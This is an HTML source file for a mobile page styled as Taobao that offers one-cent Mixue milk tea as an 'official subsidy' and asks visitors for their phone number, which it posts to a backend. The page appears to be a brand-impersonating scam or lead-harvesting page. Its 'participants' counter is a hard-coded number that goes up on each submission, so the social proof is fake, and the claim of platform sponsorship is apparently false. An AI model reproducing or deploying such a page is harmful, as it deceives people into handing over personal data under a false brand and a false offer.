<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>淘宝</title>

<style>
body {
  margin: 0;
  background: #f7f7f7;
  font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", Arial;
}

.app {
  max-width: 430px;
  margin: auto;
  background: white;
  min-height: 100vh;
}

.banner img {
  width: 100%;
  display: block;
}

.block {
  padding: 16px;
}

.title {
  font-size: 22px;
  font-weight: 800;
  margin-bottom: 6px;
}

.sub {
  font-size: 14px;
  color: #666;
  margin-bottom: 14px;
}

.tag {
  display: inline-block;
  background: #fff0f0;
  color: #e60012;
  font-size: 12px;
  padding: 4px 8px;
  border-radius: 6px;
  margin-bottom: 10px;
}

.input {
  width: 100%;
  padding: 14px;
  font-size: 16px;
  border-radius: 12px;
  border: 1px solid #ddd;
  margin-bottom: 12px;
}

.btn {
  width: 100%;
  padding: 15px;
  border-radius: 999px;
  background: linear-gradient(135deg, #e60012, #ff6a00);
  color: white;
  font-size: 16px;
  font-weight: 700;
  border: none;
}

.notice {
  margin-top: 10px;
  font-size: 12px;
  color: #999;
  line-height: 1.5;
}

.stats {
  margin-top: 12px;
  font-size: 13px;
  color: #666;
}
</style>
</head>

<body>
<div class="app">

  <div class="banner">
    <img src="https://ftp.mioz.cn/test/2026/02/10/1770687605.PNG">
  </div>

  <div class="block">
    <div class="tag">限时福利</div>
    <div class="title">一分钱点蜜雪冰城奶茶</div>
    <div class="sub">官方补贴 · 数量有限 · 每人限领 1 次</div>

    <input id="phone" class="input" placeholder="请输入11位手机号">

    <label style="font-size:13px;display:block;margin-bottom:12px;">
      <input type="checkbox" id="agree"> 我已阅读并同意活动规则与隐私政策
    </label>

    <button class="btn" onclick="submitPhone()">立即领取 ¥0.01 奶茶</button>

    <div id="msg" class="stats"></div>

    <div class="notice">
      · 活动由淘宝平台补贴<br>
      · 资格有限，先到先得<br>
      · 最终解释权归活动方所有
    </div>
  </div>

</div>

<script>
let count = 7423;

// 原来的提交函数 全部 替换成这个
async function submitPhone() {
  const phone = document.getElementById("phone").value.trim();
  const msg = document.getElementById("msg");
  const agree = document.getElementById("agree").checked;

  if (!agree) {
    msg.innerText = "请勾选授权";
    msg.style.color = "red";
    return;
  }

  if (!/^1\d{10}$/.test(phone)) {
    msg.innerText = "手机号格式错误";
    msg.style.color = "red";
    return;
  }

  try {
    const resp = await fetch("/api/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone })
    });

    const data = await resp.json();
    count++;
    msg.innerText = "提交成功，当前已有 " + count + " 人参与";
    msg.style.color = "green";
  } catch (e) {
    msg.innerText = "提交失败，请重试";
    msg.style.color = "red";
  }
}
</script>

</body>
</html>
